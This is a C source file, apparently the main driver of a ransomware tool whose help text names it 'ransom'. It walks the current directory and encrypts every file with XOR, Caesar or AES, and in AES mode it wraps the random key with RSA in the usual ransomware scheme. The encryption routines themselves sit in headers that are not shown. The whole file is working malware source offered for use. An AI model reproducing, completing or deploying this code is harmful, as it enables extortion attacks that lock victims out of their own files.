#include <stdio.h>
#include "./encryption/encryption.h"
#include "./reduntant/redundant.h"

#define FINISH 0;
#define XOR 1
#define CAESAR_ENC 2
#define CAESAR_DEC 21
#define AES_ENC 3
#define AES_DEC 31
#define SIG_OK 0
#define SIG_ERROR 1
#define SIG_AES_ENC 300

int check_flags(char *args[]){
    if (strcmp(args[1],"--help") == 0){
        printf("Usage: ransom --[OPTION]\n");
        printf("Be use --help to specifics.\n");
        printf("\n");
        printf("--XOR <key>\n");
        printf("    - Uses a XOR algorithm to cipher files.\n");
        printf("\n");
        printf("--caesar <encode/decode> <key>\n");
        printf("    - Uses a caesar algorithm to jump <key> bits on every file.\n");
        printf("    - <encode> jumps \"forward\" while <decode> jumps \"backwars\".\n");
        printf("\n");
        printf("--AES <encode/decode>\n");
        printf("    - Uses AES algorithm to cipher files.\n");
        printf("    - It generates a random key and cipher this key with RSA.\n");
        return 0;
    }
    if (strcmp(args[1],"--XOR") == 0){
        return XOR;
    }
    if (strcmp(args[1], "--caesar") == 0){
        if (strcmp(args[2],"encode") == 0){
            return CAESAR_ENC;
        }
        if (strcmp(args[2], "decode") == 0){
            return CAESAR_DEC;
        } 
    }
    if (strcmp(args[1], "--AES") == 0){
        if (strcmp(args[2],"encode") == 0){
            return AES_ENC;
        }
        if (strcmp(args[2], "decode") == 0){
            return AES_DEC;
        } 
    }
    return -1;
}

int main(int argc, char *argv[]){
    FileStruct file;
    int encoder_ID = check_flags(argv);
    int SIG_RECEIVED = 0;
    if (encoder_ID == AES_DEC){
        RSA_decrypt();
    }
    if (encoder_ID != 0){
        walk("./", &file, encoder_ID, argv, &SIG_RECEIVED);
    }

    switch (SIG_RECEIVED) {
        case 0:{
            return 0;
        }
        case 1:{
            printf("An error ocurred\n");
            return 1;
        }
        case 300:{
            RSA_encrypt();
            return 0;

        }
    }
    return 0;
}
